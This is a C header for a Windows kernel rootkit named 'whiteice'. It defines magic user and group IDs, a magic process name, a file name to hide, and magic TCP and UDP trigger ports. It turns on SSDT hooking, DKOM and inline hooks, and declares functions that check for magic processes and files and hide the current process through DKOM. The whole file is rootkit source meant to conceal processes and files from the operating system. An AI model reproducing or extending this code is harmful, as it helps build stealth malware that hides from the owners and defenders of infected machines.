#ifndef __WHITEICE_DEFS_H
#define __WHITEICE_DEFS_H

#define WHITEICE_VERSION      "0.1a-dev"
#define MAGIC_GID             8888
#define MAGIC_GID_STR         "8888"
#define MAGIC_UID             4242
#define MAGIC_PROCESS_NAME    "whiteice.exe"
#define MAGIC_FILE_NAME       "ocultame.txt"
#define MAGIC_TCP_PORT        0x1F41  // Puerto 8001
#define MAGIC_UDP_PORT        0x1F42  // Puerto 8002

/* Hook Modes */
#define ENABLE_SSDT_HOOKS     1
#define ENABLE_DKOM           1
#define ENABLE_IDT_HOOK       0
#define ENABLE_INLINE_HOOK    1
#define ENABLE_SYSENTER_PATCH 0

/* Debugging */
#define WHITEICE_DEBUG        1
#define USE_DBGPRINT          1
#define LOG_TO_SERIAL         0

#if WHITEICE_DEBUG && USE_DBGPRINT
    #define DBG(x, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, x, __VA_ARGS__)
#else
    #define DBG(x, ...)
#endif


struct ip_hdr {
    unsigned char  ip_hl:4;
    unsigned char  ip_v:4;
    unsigned char  ip_tos;
    unsigned short ip_tot_len;
    unsigned short ip_id;
    unsigned short ip_off;
    unsigned char  ip_ttl;
    unsigned char  ip_protocol;
    unsigned short ip_sum;
    unsigned int   ip_saddr;
    unsigned int   ip_daddr;
};

struct tcp_hdr {
    unsigned short tcp_sport;
    unsigned short tcp_dport;
    unsigned int   tcp_seq;
    unsigned int   tcp_ack;
    unsigned char  tcp_x2:4;
    unsigned char  tcp_off:4;
    unsigned char  tcp_flags;
    unsigned short tcp_win;
    unsigned short tcp_sum;
    unsigned short tcp_urp;
};

struct udp_hdr {
    unsigned short udp_sport;
    unsigned short udp_dport;
    unsigned short udp_ulen;
    unsigned short udp_sum;
};


PVOID WhiteiceGetSystemRoutineAddress(const char* name);
BOOLEAN WhiteiceCheckMagicProcess(PCWSTR name);
BOOLEAN WhiteiceCheckMagicFile(PCWSTR name);
VOID HideCurrentProcessViaDkom();

#define WHITEICE_ALIGN(x, a) (((x) + ((a)-1)) & ~((a)-1))
#define WHITEICE_ARRAY_SIZE(x) (sizeof(x)/sizeof((x)[0]))
#define MAX_PATH_WI 260

#endif
